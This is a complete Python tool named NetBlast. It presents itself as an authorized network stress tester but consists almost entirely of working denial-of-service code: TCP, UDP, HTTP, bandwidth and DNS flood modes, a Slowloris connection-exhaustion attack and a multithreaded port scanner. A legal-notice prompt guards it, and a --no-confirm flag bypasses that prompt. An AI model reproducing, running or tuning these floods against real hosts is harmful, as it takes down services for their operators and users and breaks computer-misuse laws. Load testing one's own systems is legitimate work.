#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║             N E T B L A S T  v1.0                   ║
║       Cybersecurity Network Stress Testing           ║
╠══════════════════════════════════════════════════════╣
║  ⚠  AUTHORIZED TESTING ONLY. Own systems or         ║
║     explicit written permission required.            ║
╚══════════════════════════════════════════════════════╝
"""

import argparse, socket, ssl, threading, time, random
import string, sys, json, statistics
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from collections import defaultdict

R="\033[91m";G="\033[92m";Y="\033[93m";B="\033[94m"
M="\033[95m";C="\033[96m";W="\033[97m";DIM="\033[2m";BOLD="\033[1m";RST="\033[0m"

BANNER = f"""
{C}{BOLD}
  ███╗   ██╗███████╗████████╗██████╗ ██╗      █████╗ ███████╗████████╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██╔══██╗██╔════╝╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║   ██████╔╝██║     ███████║███████╗   ██║
  ██║╚██╗██║██╔══╝     ██║   ██╔══██╗██║     ██╔══██║╚════██║   ██║
  ██║ ╚████║███████╗   ██║   ██████╔╝███████╗██║  ██║███████║   ██║
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝
{RST}{Y}               Network Stress Testing Framework v1.2{RST}
{DIM}      ⚠  Authorized use only | Pentesting & load testing only{RST}
"""

# ── Stats Tracker ──────────────────────────────────────────────────────
class Stats:
    def __init__(self):
        self.lock=threading.Lock(); self.sent=self.success=self.failed=self.bytes_sent=0
        self.latencies=[]; self.start_time=time.time(); self.errors=defaultdict(int)

    def record(self, ok, bytes_=0, latency=None, error=None):
        with self.lock:
            self.sent+=1; self.bytes_sent+=bytes_
            if ok: self.success+=1
            else:
                self.failed+=1
                if error: self.errors[error]+=1
            if latency is not None: self.latencies.append(latency)

    def report(self):
        el=time.time()-self.start_time; rps=self.sent/el if el else 0
        mbps=(self.bytes_sent*8/1e6)/el if el else 0
        lats=self.latencies
        avg=statistics.mean(lats) if lats else 0
        p95=sorted(lats)[int(len(lats)*.95)] if len(lats)>5 else avg
        pct=(self.success/self.sent*100) if self.sent else 0
        print(f"\n{BOLD}{C}{'='*58}{RST}")
        print(f"{BOLD}{W}  RESULTS{RST}")
        print(f"{C}{'='*58}{RST}")
        print(f"  {W}Duration      {RST}: {el:.2f}s")
        print(f"  {W}Total Reqs    {RST}: {self.sent:,}")
        print(f"  {G}Successful    {RST}: {self.success:,}  ({pct:.1f}%)")
        print(f"  {R}Failed        {RST}: {self.failed:,}")
        print(f"  {Y}Throughput    {RST}: {rps:.1f} req/s")
        print(f"  {M}Bandwidth     {RST}: {mbps:.2f} Mbps  ({self.bytes_sent/1048576:.2f} MB)")
        if lats:
            print(f"  {W}Latency       {RST}: min={min(lats)*1000:.1f}ms  "
                  f"avg={avg*1000:.1f}ms  p95={p95*1000:.1f}ms  max={max(lats)*1000:.1f}ms")
        if self.errors:
            print(f"  {R}Errors        {RST}:")
            for e,c in sorted(self.errors.items(),key=lambda x:-x[1])[:5]:
                print(f"    {c:>6}x  {DIM}{e}{RST}")
        print(f"{C}{'='*58}{RST}\n")


def dashboard(stats, stop_ev, name):
    while not stop_ev.is_set():
        el=time.time()-stats.start_time; rps=stats.sent/el if el else 0
        mbps=(stats.bytes_sent*8/1e6)/el if el else 0
        pct=(stats.success/stats.sent*100) if stats.sent else 0
        lat=(statistics.mean(stats.latencies[-100:])*1000) if stats.latencies else 0
        b=int(pct/100*18); bar=f"{G}{'#'*b}{R}{'.'*(18-b)}{RST}"
        sys.stdout.write(f"\r  {C}{name:<16}{RST} [{bar}] {W}{rps:>7.0f}{RST} rps  "
                         f"{M}{mbps:>6.2f}{RST} Mbps  {Y}{lat:>6.1f}{RST} ms  "
                         f"{G}{stats.success:>7,}{RST} ok  {R}{stats.failed:>5,}{RST} err")
        sys.stdout.flush(); time.sleep(0.5)


# ── TCP Flood ──────────────────────────────────────────────────────────
def _tcp(host,port,stats,dur,psize):
    end=time.time()+dur; payload=random.randbytes(psize)
    while time.time()<end:
        t0=time.time()
        try:
            with socket.create_connection((host,port),timeout=5) as s:
                s.sendall(payload); stats.record(True,len(payload),time.time()-t0)
        except Exception as e: stats.record(False,error=type(e).__name__)

def run_tcp(a):
    print(f"\n{B}[TCP FLOOD]{RST} {W}{a.host}:{a.port}{RST}  "
          f"threads={W}{a.threads}{RST}  dur={W}{a.duration}s{RST}  payload={W}{a.payload}B{RST}")
    s=Stats(); stop=threading.Event()
    threading.Thread(target=dashboard,args=(s,stop,"TCP Flood"),daemon=True).start()
    with ThreadPoolExecutor(a.threads) as ex:
        for f in as_completed([ex.submit(_tcp,a.host,a.port,s,a.duration,a.payload) for _ in range(a.threads)]): pass
    stop.set(); print(); s.report()


# ── UDP Flood ──────────────────────────────────────────────────────────
def _udp(host,port,stats,dur,psize):
    end=time.time()+dur; data=random.randbytes(psize)
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    try:
        while time.time()<end:
            t0=time.time()
            try: sock.sendto(data,(host,port)); stats.record(True,len(data),time.time()-t0)
            except Exception as e: stats.record(False,error=type(e).__name__)
    finally: sock.close()

def run_udp(a):
    print(f"\n{B}[UDP FLOOD]{RST} {W}{a.host}:{a.port}{RST}  threads={W}{a.threads}{RST}  payload={W}{a.payload}B{RST}")
    s=Stats(); stop=threading.Event()
    threading.Thread(target=dashboard,args=(s,stop,"UDP Flood"),daemon=True).start()
    with ThreadPoolExecutor(a.threads) as ex:
        for f in as_completed([ex.submit(_udp,a.host,a.port,s,a.duration,a.payload) for _ in range(a.threads)]): pass
    stop.set(); print(); s.report()


# ── HTTP Stress ────────────────────────────────────────────────────────
UAS=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0",
     "curl/8.4.0"]

def _http(host,port,path,stats,dur,use_ssl,method,keepalive):
    end=time.time()+dur
    ctx=ssl.create_default_context() if use_ssl else None
    if ctx: ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    conn=None
    while time.time()<end:
        t0=time.time()
        try:
            if conn is None:
                raw=socket.create_connection((host,port),timeout=5)
                conn=ctx.wrap_socket(raw,server_hostname=host) if use_ssl else raw
            rid=''.join(random.choices(string.ascii_lowercase,k=8))
            body=json.dumps({"id":rid}).encode() if method in("POST","PUT") else b""
            req=(f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAS)}\r\n"
                 f"X-Request-ID: {rid}\r\nContent-Length: {len(body)}\r\n"
                 f"Connection: {'keep-alive' if keepalive else 'close'}\r\n\r\n").encode()+body
            conn.sendall(req)
            resp=b""
            while b"\r\n" not in resp:
                c=conn.recv(256);
                if not c: break
                resp+=c
            stats.record(b"HTTP/" in resp,len(req),time.time()-t0)
            if not keepalive: conn.close(); conn=None
        except Exception as e:
            if conn:
                try: conn.close()
                except: pass
                conn=None
            stats.record(False,error=type(e).__name__)

def run_http(a):
    ssl_=a.ssl or a.port==443; scheme="HTTPS" if ssl_ else "HTTP"
    print(f"\n{B}[{scheme} STRESS]{RST} {W}{a.host}:{a.port}{a.path}{RST}  "
          f"method={W}{a.method}{RST}  threads={W}{a.threads}{RST}  keepalive={W}{a.keepalive}{RST}")
    s=Stats(); stop=threading.Event()
    threading.Thread(target=dashboard,args=(s,stop,f"{scheme} Stress"),daemon=True).start()
    with ThreadPoolExecutor(a.threads) as ex:
        for f in as_completed([ex.submit(_http,a.host,a.port,a.path,s,a.duration,ssl_,a.method,a.keepalive) for _ in range(a.threads)]): pass
    stop.set(); print(); s.report()


# ── Slow Loris ─────────────────────────────────────────────────────────
def _loris(host,port,stats,dur,use_ssl):
    end=time.time()+dur
    ctx=ssl.create_default_context() if use_ssl else None
    if ctx: ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    socks=[]
    try:
        while time.time()<end:
            try:
                raw=socket.create_connection((host,port),timeout=4)
                if use_ssl: raw=ctx.wrap_socket(raw,server_hostname=host)
                raw.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                socks.append(raw); stats.record(True,50)
            except: pass
            dead=[]
            for sk in socks:
                try: sk.send(b"X-Pad: x\r\n"); stats.record(True,10)
                except: dead.append(sk)
            for d in dead: socks.remove(d); stats.record(False,error="Dead")
            time.sleep(0.5)
    finally:
        for sk in socks:
            try: sk.close()
            except: pass

def run_loris(a):
    ssl_=a.ssl or a.port==443
    print(f"\n{B}[SLOW LORIS]{RST} {W}{a.host}:{a.port}{RST}  threads={W}{a.threads}{RST}  dur={W}{a.duration}s{RST}")
    s=Stats(); stop=threading.Event()
    threading.Thread(target=dashboard,args=(s,stop,"Slow Loris"),daemon=True).start()
    with ThreadPoolExecutor(a.threads) as ex:
        for f in as_completed([ex.submit(_loris,a.host,a.port,s,a.duration,ssl_) for _ in range(a.threads)]): pass
    stop.set(); print(); s.report()


# ── Port Scanner ───────────────────────────────────────────────────────
SVCS={21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",443:"HTTPS",
      445:"SMB",3306:"MySQL",3389:"RDP",5432:"Postgres",6379:"Redis",
      8080:"HTTP-Alt",8443:"HTTPS-Alt",27017:"MongoDB"}

def _scan(host,port,timeout):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(timeout)
        r=s.connect_ex((host,port)); s.close(); return port,r==0
    except: return port,False

def run_scan(a):
    s,e=map(int,a.ports.split("-")) if "-" in a.ports else (int(a.ports),int(a.ports))
    ports=list(range(s,e+1))
    print(f"\n{B}[PORT SCAN]{RST} {W}{a.host}{RST}  range={W}{s}-{e}{RST}  ({len(ports)} ports)  threads={W}{a.threads}{RST}\n")
    open_p=[]; done=0; t0=time.time()
    with ThreadPoolExecutor(a.threads) as ex:
        futs={ex.submit(_scan,a.host,p,a.timeout):p for p in ports}
        for f in as_completed(futs):
            p,ok=f.result(); done+=1
            if ok:
                open_p.append(p)
                print(f"\r  {G}OPEN{RST}  {W}{p:>5}{RST}  {DIM}{SVCS.get(p,'?')}{RST}                 ")
            sys.stdout.write(f"\r  Scanning... {done/len(ports)*100:5.1f}%")
            sys.stdout.flush()
    print(f"\n\n{C}{'='*40}{RST}")
    print(f"  Done in {time.time()-t0:.2f}s  |  Open ports: {G}{len(open_p)}{RST}")
    if open_p: print(f"  {', '.join(map(str,sorted(open_p)))}")
    print(f"{C}{'='*40}{RST}\n")


# ── Bandwidth Probe ────────────────────────────────────────────────────
def _bw(host,port,stats,dur,chunk):
    end=time.time()+dur; data=random.randbytes(chunk)
    while time.time()<end:
        t0=time.time()
        try:
            with socket.create_connection((host,port),timeout=5) as s:
                total=0
                while time.time()<end: s.sendall(data); total+=len(data)
                stats.record(True,total,time.time()-t0)
        except Exception as e: stats.record(False,error=type(e).__name__)

def run_bw(a):
    print(f"\n{B}[BANDWIDTH PROBE]{RST} {W}{a.host}:{a.port}{RST}  threads={W}{a.threads}{RST}  chunk={W}{a.payload}B{RST}")
    s=Stats(); stop=threading.Event()
    threading.Thread(target=dashboard,args=(s,stop,"Bandwidth"),daemon=True).start()
    with ThreadPoolExecutor(a.threads) as ex:
        for f in as_completed([ex.submit(_bw,a.host,a.port,s,a.duration,a.payload) for _ in range(a.threads)]): pass
    stop.set(); print(); s.report()


# ── DNS Stress ─────────────────────────────────────────────────────────
def _dns(domains,stats,dur):
    end=time.time()+dur
    while time.time()<end:
        d=random.choice(domains); t0=time.time()
        try: socket.gethostbyname(d); stats.record(True,len(d),time.time()-t0)
        except Exception as e: stats.record(False,error=type(e).__name__)

def run_dns(a):
    domains=a.domains.split(",") if a.domains else \
        [f"{''.join(random.choices(string.ascii_lowercase,k=8))}.com" for _ in range(200)]
    print(f"\n{B}[DNS STRESS]{RST} domains={W}{len(domains)}{RST}  threads={W}{a.threads}{RST}  dur={W}{a.duration}s{RST}")
    s=Stats(); stop=threading.Event()
    threading.Thread(target=dashboard,args=(s,stop,"DNS Stress"),daemon=True).start()
    with ThreadPoolExecutor(a.threads) as ex:
        for f in as_completed([ex.submit(_dns,domains,s,a.duration) for _ in range(a.threads)]): pass
    stop.set(); print(); s.report()


# ── Entry Point ────────────────────────────────────────────────────────
def confirm(host):
    print(f"\n{R}{BOLD}  LEGAL NOTICE{RST}")
    print(f"{Y}  Unauthorized stress testing is illegal (CFAA, Computer Misuse Act, etc.).")
    print(f"  Only proceed if you own or have explicit written permission to test:{RST} {W}{host}{RST}\n")
    if input(f"  Authorized? [yes/no]: ").strip().lower() != "yes":
        print(f"\n{R}  Aborted.{RST}\n"); sys.exit(0)

def main():
    print(BANNER)
    p=argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""EXAMPLES:
  python netblast.py tcp       --host 192.168.1.10 --port 8080 --threads 200 --duration 30
  python netblast.py udp       --host 192.168.1.10 --port 53   --threads 50  --payload 512
  python netblast.py http      --host 192.168.1.10 --port 80   --threads 100 --method GET --keepalive
  python netblast.py slowloris --host 192.168.1.10 --port 80   --threads 500 --duration 120
  python netblast.py portscan  --host 192.168.1.10 --ports 1-65535 --threads 2000
  python netblast.py bandwidth --host 192.168.1.10 --port 9999 --threads 8   --payload 65536
  python netblast.py dns       --threads 50 --duration 30 --domains example.com,test.com""")
    p.add_argument("mode",choices=["tcp","udp","http","slowloris","portscan","bandwidth","dns"])
    p.add_argument("--host",default="127.0.0.1"); p.add_argument("--port",type=int,default=80)
    p.add_argument("--threads",type=int,default=50); p.add_argument("--duration",type=int,default=30)
    p.add_argument("--timeout",type=float,default=2.0); p.add_argument("--payload",type=int,default=1024)
    p.add_argument("--no-confirm",action="store_true")
    p.add_argument("--path",default="/"); p.add_argument("--method",default="GET",choices=["GET","POST","PUT","HEAD"])
    p.add_argument("--ssl",action="store_true"); p.add_argument("--keepalive",action="store_true")
    p.add_argument("--ports",default="1-1024")
    p.add_argument("--dns-server",default="8.8.8.8"); p.add_argument("--domains",default=None)
    a=p.parse_args()
    if not a.no_confirm: confirm(a.host)
    print(f"\n{DIM}  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RST}")
    try:
        {"tcp":run_tcp,"udp":run_udp,"http":run_http,"slowloris":run_loris,
         "portscan":run_scan,"bandwidth":run_bw,"dns":run_dns}[a.mode](a)
    except KeyboardInterrupt:
        print(f"\n\n{Y}  Interrupted.{RST}\n")

if __name__=="__main__":
    main()
